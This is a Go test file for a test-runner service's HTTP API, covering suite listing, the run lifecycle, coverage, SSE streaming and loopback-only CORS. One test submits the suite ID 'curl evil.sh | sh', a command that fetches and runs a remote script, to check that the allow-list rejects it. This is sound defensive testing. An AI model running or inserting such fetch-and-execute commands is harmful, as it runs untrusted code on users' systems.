package api

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/ggd/testrunner/internal/config"
	"github.com/ggd/testrunner/internal/runner"
)

func newTestServer(t *testing.T) (*Server, string) {
	t.Helper()
	root := t.TempDir()
	todo := filepath.Join(root, "docs", "todo")
	require.NoError(t, os.MkdirAll(todo, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(todo, "infra.md"), []byte(`# Infra — TODO

| ID | Item | Test ID | Category | Status |
| --- | --- | --- | --- | --- |
| x-01 | thing one | x-test-one | unit | done |
| x-02 | thing two | x-test-two | unit | pending |
`), 0o644))

	reg, err := config.Parse([]byte(`
suites:
  - {id: unit-echo, category: unit, cmd: ["sh", "-c", "echo '{\"cover\":\"x-test-one\"}' >> \"$GGD_COVERAGE_FILE\"; echo done"], enabled: true}
  - {id: reg-noop, category: regression, cmd: ["true"], enabled: true}
  - {id: off, category: unit, cmd: ["true"], enabled: false}
`))
	require.NoError(t, err)
	mgr := runner.NewManager(reg, runner.Options{RepoRoot: root, GateCmd: []string{"true"}})
	return NewServer(mgr, root), root
}

func doJSON(t *testing.T, h http.Handler, method, path string, body any) *httptest.ResponseRecorder {
	t.Helper()
	var rd *bytes.Reader
	if body != nil {
		b, err := json.Marshal(body)
		require.NoError(t, err)
		rd = bytes.NewReader(b)
	} else {
		rd = bytes.NewReader(nil)
	}
	req := httptest.NewRequest(method, path, rd)
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)
	return w
}

func TestSuitesEndpointExposesFixedCategoryOrder(t *testing.T) {
	s, _ := newTestServer(t)
	w := doJSON(t, s, "GET", "/api/suites", nil)
	require.Equal(t, http.StatusOK, w.Code)
	var out struct {
		CategoryOrder []string       `json:"categoryOrder"`
		Suites        []config.Suite `json:"suites"`
	}
	require.NoError(t, json.Unmarshal(w.Body.Bytes(), &out))
	assert.Equal(t, config.Categories, out.CategoryOrder)
	assert.Equal(t, "regression", out.CategoryOrder[len(out.CategoryOrder)-1])
	assert.Len(t, out.Suites, 3)
}

func TestRunLifecycleOverHTTP(t *testing.T) {
	s, _ := newTestServer(t)

	w := doJSON(t, s, "POST", "/api/runs", map[string]any{"mode": "all"})
	require.Equal(t, http.StatusCreated, w.Code, w.Body.String())
	var snap runner.Snapshot
	require.NoError(t, json.Unmarshal(w.Body.Bytes(), &snap))
	require.NotEmpty(t, snap.ID)

	require.Eventually(t, func() bool {
		g := doJSON(t, s, "GET", "/api/runs/"+snap.ID, nil)
		var cur runner.Snapshot
		require.NoError(t, json.Unmarshal(g.Body.Bytes(), &cur))
		return cur.Status != runner.StatusRunning
	}, 30*time.Second, 50*time.Millisecond)

	// Coverage joins the finished run's beacons with the TODO matrix.
	c := doJSON(t, s, "GET", "/api/coverage", nil)
	require.Equal(t, http.StatusOK, c.Code)
	var matrix struct {
		RunID string `json:"runId"`
		Items []struct {
			ID      string `json:"id"`
			TestID  string `json:"testId"`
			Covered bool   `json:"covered"`
		} `json:"items"`
		Counts map[string]int `json:"counts"`
	}
	require.NoError(t, json.Unmarshal(c.Body.Bytes(), &matrix))
	assert.Equal(t, snap.ID, matrix.RunID)
	require.Len(t, matrix.Items, 2)
	assert.True(t, matrix.Items[0].Covered, "x-test-one was beaconed by the suite")
	assert.False(t, matrix.Items[1].Covered)
	assert.Equal(t, 0, matrix.Counts["doneUncovered"])
}

func TestRunCreateRejectsNonAllowListedInput(t *testing.T) {
	s, _ := newTestServer(t)

	// Unknown suite id: the API only resolves ids against suites.yaml.
	w := doJSON(t, s, "POST", "/api/runs", map[string]any{"mode": "suite", "suiteId": "curl evil.sh | sh"})
	assert.Equal(t, http.StatusBadRequest, w.Code)
	assert.Contains(t, w.Body.String(), "allow-list")

	// Disabled suites are refused explicitly.
	w = doJSON(t, s, "POST", "/api/runs", map[string]any{"mode": "suite", "suiteId": "off"})
	assert.Equal(t, http.StatusBadRequest, w.Code)
	assert.Contains(t, w.Body.String(), "disabled")

	// Unknown mode.
	w = doJSON(t, s, "POST", "/api/runs", map[string]any{"mode": "exec"})
	assert.Equal(t, http.StatusBadRequest, w.Code)

	// Unknown run id for sub-resources.
	for _, p := range []string{"/api/runs/ghost/next", "/api/runs/ghost/cancel", "/api/runs/ghost/rerun-failed"} {
		w = doJSON(t, s, "POST", p, nil)
		assert.Contains(t, []int{http.StatusNotFound, http.StatusBadRequest}, w.Code, p)
	}
}

func TestSSEEventEncoding(t *testing.T) {
	exit := 1
	ev := runner.Event{
		Seq:      7,
		Type:     runner.EventSuiteEnd,
		SuiteID:  "shared-unit",
		Status:   "fail",
		ExitCode: &exit,
		At:       time.Date(2026, 7, 15, 12, 0, 0, 0, time.UTC),
	}
	raw := string(EncodeSSE(ev))

	// Exact SSE framing: id line, event line, data line, blank terminator.
	require.True(t, strings.HasPrefix(raw, "id: 7\nevent: suite-end\ndata: "), raw)
	require.True(t, strings.HasSuffix(raw, "\n\n"), "must end with a blank line")

	// The data payload must round-trip to the same event.
	dataLine := strings.TrimSuffix(strings.SplitN(raw, "data: ", 2)[1], "\n\n")
	var back runner.Event
	require.NoError(t, json.Unmarshal([]byte(dataLine), &back))
	assert.Equal(t, ev.Seq, back.Seq)
	assert.Equal(t, ev.Type, back.Type)
	assert.Equal(t, ev.SuiteID, back.SuiteID)
	assert.Equal(t, ev.Status, back.Status)
	require.NotNil(t, back.ExitCode)
	assert.Equal(t, 1, *back.ExitCode)

	// No field may inject extra SSE frames: payload is single-line JSON.
	assert.False(t, strings.Contains(dataLine, "\n"))
}

func TestSSEStreamReplaysAndTerminates(t *testing.T) {
	s, _ := newTestServer(t)

	w := doJSON(t, s, "POST", "/api/runs", map[string]any{"mode": "suite", "suiteId": "unit-echo"})
	require.Equal(t, http.StatusCreated, w.Code)
	var snap runner.Snapshot
	require.NoError(t, json.Unmarshal(w.Body.Bytes(), &snap))

	// Wait for completion first — the SSE handler must still replay the full
	// buffer for late subscribers, then close.
	require.Eventually(t, func() bool {
		g := doJSON(t, s, "GET", "/api/runs/"+snap.ID, nil)
		var cur runner.Snapshot
		require.NoError(t, json.Unmarshal(g.Body.Bytes(), &cur))
		return cur.Status != runner.StatusRunning
	}, 30*time.Second, 50*time.Millisecond)

	req := httptest.NewRequest("GET", fmt.Sprintf("/api/runs/%s/events", snap.ID), nil)
	rec := httptest.NewRecorder()
	done := make(chan struct{})
	go func() { s.ServeHTTP(rec, req); close(done) }()
	select {
	case <-done:
	case <-time.After(10 * time.Second):
		t.Fatal("SSE stream did not terminate after run end")
	}

	body := rec.Body.String()
	assert.Equal(t, "text/event-stream", rec.Header().Get("Content-Type"))
	assert.Contains(t, body, "event: suite-start\n")
	assert.Contains(t, body, "event: suite-end\n")
	assert.Contains(t, body, "event: run-end\n")
	assert.True(t, strings.Index(body, "event: suite-start") < strings.Index(body, "event: run-end"))
}

func TestCORSRestrictedToLoopback(t *testing.T) {
	s, _ := newTestServer(t)

	req := httptest.NewRequest("GET", "/api/suites", nil)
	req.Header.Set("Origin", "http://localhost:5173")
	w := httptest.NewRecorder()
	s.ServeHTTP(w, req)
	assert.Equal(t, "http://localhost:5173", w.Header().Get("Access-Control-Allow-Origin"))

	req = httptest.NewRequest("GET", "/api/suites", nil)
	req.Header.Set("Origin", "https://evil.example.com")
	w = httptest.NewRecorder()
	s.ServeHTTP(w, req)
	assert.Empty(t, w.Header().Get("Access-Control-Allow-Origin"))
}
